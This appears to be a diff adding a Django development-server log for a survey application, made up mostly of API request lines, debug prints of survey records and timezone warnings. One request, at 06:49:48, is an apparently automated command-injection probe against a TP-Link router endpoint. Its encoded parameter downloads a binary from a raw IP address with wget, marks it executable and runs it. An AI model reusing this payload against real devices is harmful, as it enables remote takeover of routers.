@@ -1,0 +1,1174 @@
+[09/Jun/2024 06:18:01] "POST /api/qs/Submit/get_survey_data HTTP/1.0" 200 673
+[09/Jun/2024 06:18:05] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.0" 200 63
+[09/Jun/2024 06:18:09] "POST /api/qs/Submit/get_survey_data HTTP/1.0" 200 673
+[09/Jun/2024 06:18:09] "POST /api/qs/Submit/get_survey_data HTTP/1.0" 200 673
+[09/Jun/2024 06:18:17] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.0" 200 63
+[09/Jun/2024 06:18:25] "POST /api/qs/Submit/get_square_survey_data HTTP/1.0" 200 900
+[09/Jun/2024 06:18:33] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.0" 200 1122
+[09/Jun/2024 06:18:35] "POST /api/qs/Submit/get_square_survey_data HTTP/1.0" 200 900
+[09/Jun/2024 06:18:43] "POST /api/qs/Submit/get_history HTTP/1.0" 200 63
+[09/Jun/2024 06:18:46] "POST /api/qs/Submit/get_square_survey_data HTTP/1.0" 200 900
+[09/Jun/2024 06:18:49] "POST /api/qs/Submit/get_survey_data HTTP/1.0" 200 673
+[09/Jun/2024 06:18:51] "POST /api/qs/Submit/get_survey_data HTTP/1.0" 200 673
+[09/Jun/2024 06:18:54] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.0" 200 709
+[09/Jun/2024 06:24:54] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.0" 200 709
+[09/Jun/2024 06:25:07] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.0" 200 63
+/root/wtf/lib64/python3.6/site-packages/django/db/models/fields/__init__.py:1419: RuntimeWarning: DateTimeField Survey.release_time received a naive datetime (2024-06-09 06:25:14.040160) while time zone support is active.
+  RuntimeWarning)
+[09/Jun/2024 06:25:14] "POST /api/qs/Submit/deploy_qn HTTP/1.0" 200 40
+[09/Jun/2024 06:25:15] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.0" 200 502
+[09/Jun/2024 06:25:35] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 532
+[09/Jun/2024 06:25:45] "POST /api/qs/Submit/pause_qn HTTP/1.1" 200 40
+[09/Jun/2024 06:25:47] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 1058
+Building prefix dict from the default dictionary ...
+Loading model from cache /tmp/jieba.cache
+Loading model cost 0.778 seconds.
+Prefix dict has been built successfully.
+[09/Jun/2024 06:25:48] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 308
+[09/Jun/2024 06:25:48] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 366
+[09/Jun/2024 06:27:44] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 532
+[09/Jun/2024 06:28:44] "POST /api/qs/Submit/get_history HTTP/1.1" 200 710
+[09/Jun/2024 06:30:06] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 498
+[09/Jun/2024 06:30:11] "POST /api/qs/Submit/get_history HTTP/1.1" 200 710
+[09/Jun/2024 06:31:05] "POST /api/qs/Submit/get_survey_data HTTP/1.0" 200 673
+[09/Jun/2024 06:31:09] "POST /api/qs/Submit/get_square_survey_data HTTP/1.0" 200 900
+[09/Jun/2024 06:31:31] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1530
+[09/Jun/2024 06:31:38] "POST /api/qs/Submit/buy_survey HTTP/1.1" 200 37
+[09/Jun/2024 06:31:40] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 06:31:45] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1543
+[09/Jun/2024 06:31:49] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 06:31:49] "POST /api/qs/Submit/get_square_survey_data HTTP/1.0" 200 900
+Performing system checks...
+
+System check identified no issues (0 silenced).
+June 09, 2024 - 06:16:20
+Django version 3.2.25, using settings 'config.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+i am here
+i am here
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 1}]
+[]
+[]
+[]
+i am here
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 1}]
+[]
+[]
+[]
+yangyang
+wtf
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 1}]
+[]
+[]
+[]
+i am here
+i am here
+i am here
+i am here
+150 doublepi
+150
+None
+150
+[[{'name': '选项1', 'y': 1}, {'name': '选项2', 'y': 0}], [{'name': '选项1', 'y': 1}, {'name': '选项2', 'y': 1}], [{'name': 0, 'y': 0}, {'name': 1, 'y': 0}, {'name': 2, 'y': 1}, {'name': 3, 'y': 0}, {'name': 4, 'y': 0}], [{'name': 'hello', 'y': 1}]]
+150
+doublepi
+i am here
+doublepi
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}]
+[]
+[]
+[]
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}]
+[{'id': 62}, {'id': 62}, {'id': 113}, {'id': 124}, {'id': 150}, {'id': 133}, {'id': 53}]
+[]
+[{'id': 146, 'title': '一次考试', 'type': '1', 'state': 0, 'used_time': 1}, {'id': 147, 'title': '一次考试', 'type': '1', 'state': 0, 'used_time': 1}, {'id': 148, 'title': '一次投票', 'type': '2', 'state': 0, 'used_time': 1}, {'id': 149, 'title': '一次报名', 'type': '3', 'state': 0, 'used_time': 1}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}]
+122 doublepi
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}]
+[{'id': 62}, {'id': 62}, {'id': 113}, {'id': 124}, {'id': 150}, {'id': 133}, {'id': 53}, {'id': 122}]
+[]
+[{'id': 146, 'title': '一次考试', 'type': '1', 'state': 0, 'used_time': 1}, {'id': 147, 'title': '一次考试', 'type': '1', 'state': 0, 'used_time': 1}, {'id': 148, 'title': '一次投票', 'type': '2', 'state': 0, 'used_time': 1}, {'id': 149, 'title': '一次报名', 'type': '3', 'state': 0, 'used_time': 1}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}]
+133 doublepi
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}]
+[]
+[]
+[]
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}][09/Jun/2024 06:31:52] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1543
+[09/Jun/2024 06:31:55] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 1058
+[09/Jun/2024 06:31:56] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 308
+[09/Jun/2024 06:31:56] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 366
+[09/Jun/2024 06:31:57] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1543
+[09/Jun/2024 06:32:35] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 532
+[09/Jun/2024 06:32:48] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 63
+[09/Jun/2024 06:32:59] "POST /api/qs/Submit/get_square_survey_data HTTP/1.0" 200 900
+[09/Jun/2024 06:33:07] "POST /api/qs/Submit/get_survey_data HTTP/1.0" 200 673
+[09/Jun/2024 06:33:16] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 06:33:21] "POST /api/qs/user/login HTTP/1.1" 200 179
+[09/Jun/2024 06:33:30] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 06:33:42] "POST /api/qs/user/login HTTP/1.1" 200 169
+[09/Jun/2024 06:34:46] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 532
+[09/Jun/2024 06:35:20] "POST /api/qs/Submit/copy_survey HTTP/1.1" 200 54
+[09/Jun/2024 06:35:21] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 658
+[09/Jun/2024 06:35:26] "POST /api/qs/Submit/edit_survey_FS HTTP/1.1" 200 913
+[09/Jun/2024 06:35:28] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 658
+/root/wtf/lib64/python3.6/site-packages/django/db/models/fields/__init__.py:1419: RuntimeWarning: DateTimeField Survey.release_time received a naive datetime (2024-06-09 06:35:30.167388) while time zone support is active.
+  RuntimeWarning)
+[09/Jun/2024 06:35:30] "POST /api/qs/Submit/deploy_qn HTTP/1.1" 200 40
+[09/Jun/2024 06:35:32] "POST /api/qs/Submit/pause_qn HTTP/1.1" 200 40
+[09/Jun/2024 06:35:33] "POST /api/qs/Submit/delete_survey_not_real HTTP/1.1" 200 40
+[09/Jun/2024 06:35:44] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 532
+[09/Jun/2024 06:35:51] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 532
+[09/Jun/2024 06:36:35] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 06:37:21] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 532
+[09/Jun/2024 06:37:25] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1543
+[09/Jun/2024 06:37:35] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 652
+[09/Jun/2024 06:38:02] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 532
+[09/Jun/2024 06:38:09] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 500 145
+
+[{'id': 62}, {'id': 62}, {'id': 113}, {'id': 124}, {'id': 150}, {'id': 133}, {'id': 53}, {'id': 122}]
+[]
+[{'id': 146, 'title': '一次考试', 'type': '1', 'state': 0, 'used_time': 1}, {'id': 147, 'title': '一次考试', 'type': '1', 'state': 0, 'used_time': 1}, {'id': 148, 'title': '一次投票', 'type': '2', 'state': 0, 'used_time': 1}, {'id': 149, 'title': '一次报名', 'type': '3', 'state': 0, 'used_time': 1}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}]
+150 doublepi
+150
+None
+150
+[[{'name': '选项1', 'y': 1}, {'name': '选项2', 'y': 0}], [{'name': '选项1', 'y': 1}, {'name': '选项2', 'y': 1}], [{'name': 0, 'y': 0}, {'name': 1, 'y': 0}, {'name': 2, 'y': 1}, {'name': 3, 'y': 0}, {'name': 4, 'y': 0}], [{'name': 'hello', 'y': 1}]]
+150
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}]
+[{'id': 62}, {'id': 62}, {'id': 113}, {'id': 124}, {'id': 150}, {'id': 133}, {'id': 53}, {'id': 122}]
+[]
+[{'id': 146, 'title': '一次考试', 'type': '1', 'state': 0, 'used_time': 1}, {'id': 147, 'title': '一次考试', 'type': '1', 'state': 0, 'used_time': 1}, {'id': 148, 'title': '一次投票', 'type': '2', 'state': 0, 'used_time': 1}, {'id': 149, 'title': '一次报名', 'type': '3', 'state': 0, 'used_time': 1}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}]
+i am here
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}]
+[]
+[]
+[]
+True
+None
+王飞阳
+444
+True
+None
+doublepi
+444
+bbb
+<class 'str'>
+aaaaa
+[{'content': '选项1', 'choosed': False}, {'content': '选项2', 'choosed': False}]
+343
+?????
+343
+?????
+bbb
+<class 'str'>
+aaaaa
+[{'content': '选项1', 'choosed': False}, {'content': '选项2', 'choosed': False}]
+344
+?????
+344
+?????
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+151
+True
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}]
+[{'id': 62}, {'id': 62}, {'id': 113}, {'id': 124}, {'id': 150}, {'id': 133}, {'id': 53}, {'id': 122}]
+[]
+[{'id': 146, 'title': '一次考试', 'type': '1', 'state': 0, 'used_time': 1}, {'id': 147, 'title': '一次考试', 'type': '1', 'state': 0, 'used_time': 1}, {'id': 148, 'title': '一次投票', 'type': '2', 'state': 0, 'used_time': 1}, {'id': 149, 'title': '一次报名', 'type': '3', 'state': 0, 'used_time': 1}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}]
+i am here
+[09/Jun/2024 06:38:28] "POST /api/qs/user/login HTTP/1.1" 200 179
+[09/Jun/2024 06:39:04] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 532
+[09/Jun/2024 06:39:09] "POST /api/qs/user/logout HTTP/1.0" 200 20
+[09/Jun/2024 06:39:13] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1518
+[09/Jun/2024 06:39:16] "POST /api/qs/Submit/collect_survey HTTP/1.1" 200 37
+[09/Jun/2024 06:39:22] "POST /api/qs/Submit/deploy_qn HTTP/1.1" 200 40
+[09/Jun/2024 06:39:29] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1531
+[09/Jun/2024 06:39:31] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1118
+[09/Jun/2024 06:39:41] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 36
+[09/Jun/2024 06:39:41] "GET / HTTP/1.1" 404 179
+[09/Jun/2024 06:39:44] "POST /api/qs/user/login HTTP/1.0" 200 18
+[09/Jun/2024 06:39:45] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1314
+[09/Jun/2024 06:39:46] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 532
+[09/Jun/2024 06:39:48] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 1058
+Building prefix dict from the default dictionary ...
+Loading model from cache /tmp/jieba.cache
+Loading model cost 0.791 seconds.
+Prefix dict has been built successfully.
+[09/Jun/2024 06:39:49] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 410
+[09/Jun/2024 06:39:49] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 547
+[09/Jun/2024 06:40:15] "POST /api/qs/user/find_password_back_FirstStep HTTP/1.0" 200 18
+[09/Jun/2024 06:40:54] "POST /api/qs/user/find_password_back_SecondStep HTTP/1.0" 200 40
+[09/Jun/2024 06:41:01] "POST /api/qs/user/login HTTP/1.0" 200 166
+[09/Jun/2024 06:41:13] "POST /api/qs/Submit/get_survey_data HTTP/1.0" 200 673
+[09/Jun/2024 06:41:19] "POST /api/qs/Submit/get_survey_data HTTP/1.0" 200 673
+[09/Jun/2024 06:41:46] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 1058
+[09/Jun/2024 06:41:46] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 410
+[09/Jun/2024 06:41:46] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 547
+[09/Jun/2024 06:42:35] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 06:42:46] "POST /api/qs/user/login HTTP/1.1" 200 109
+[09/Jun/2024 06:43:59] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 532
+[09/Jun/2024 06:46:06] "GET / HTTP/1.1" 404 179
+[09/Jun/2024 06:47:52] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 972
+[09/Jun/2024 06:47:59] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1118
+[09/Jun/2024 06:49:03] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 532
+[09/Jun/2024 06:49:16] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 36
+[09/Jun/2024 06:49:48] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.71.81%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 404 179
+[09/Jun/2024 06:50:18] "POST /api/qs/Submit/create_QN HTTP/1.1" 200 54
+[09/Jun/2024 06:50:19] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 664
+/root/wtf/lib64/python3.6/site-packages/django/db/models/fields/__init__.py:1419: RuntimeWarning: DateTimeField Survey.release_time received a naive datetime (2024-06-09 06:50:22.961703) while time zone support is active.
+  RuntimeWarning)
+[09/Jun/2024 06:50:22] "POST /api/qs/Submit/deploy_qn HTTP/1.1" 200 40
+[09/Jun/2024 06:50:27] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 430
+[09/Jun/2024 06:50:30] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 36
+[09/Jun/2024 06:50:41] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 430
+[09/Jun/2024 06:50:41] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 240
+[09/Jun/2024 06:50:41] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 106
+[09/Jun/2024 06:51:40] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 30
+[09/Jun/2024 06:55:58] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 30
+[09/Jun/2024 06:55:59] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 430
+[09/Jun/2024 06:56:19] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1061
+[09/Jun/2024 06:56:32] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1314
+[09/Jun/2024 06:56:43] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 30
+[09/Jun/2024 06:58:02] "POST /api/qs/Submit/create_QN HTTP/1.1" 200 54
+[09/Jun/2024 06:58:03] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1421
+/root/wtf/lib64/python3.6/site-packages/django/db/models/fields/__init__.py:1419: RuntimeWarning: DateTimeField Survey.release_time received a naive datetime (2024-06-09 06:58:05.656869) while time zone support is active.
+  RuntimeWarning)
+[09/Jun/2024 06:58:05] "POST /api/qs/Submit/deploy_qn HTTP/1.1" 200 40
+[09/Jun/2024 06:58:08] "POST /api/qs/Submit/release_to_square HTTP/1.1" 200 37
+[09/Jun/2024 06:58:20] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1133
+[09/Jun/2024 06:58:25] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1048
+Performing system checks...
+
+System check identified no issues (0 silenced).
+June 09, 2024 - 06:38:11
+Django version 3.2.25, using settings 'config.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+None
+王飞阳
+444
+True
+124
+124
+139
+139
+140
+140
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 0, 'used_time': 1}]
+[{'id': 53}, {'id': 60}, {'id': 62}, {'id': 131}, {'id': 134}, {'id': 139}, {'id': 140}, {'id': 138}, {'id': 142}, {'id': 113}, {'id': 124}, {'id': 143}]
+[{'id': 124}, {'id': 139}, {'id': 140}]
+[{'id': 138, 'title': '的那网络文化的俩位', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 139, 'title': '大撒旦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 140, 'title': '111', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 142, 'title': '222', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 143, 'title': '欧几哦i', 'type': '0', 'state': 1, 'used_time': 1}]
+150 王飞阳
+124
+124
+139
+139
+140
+140
+150
+150
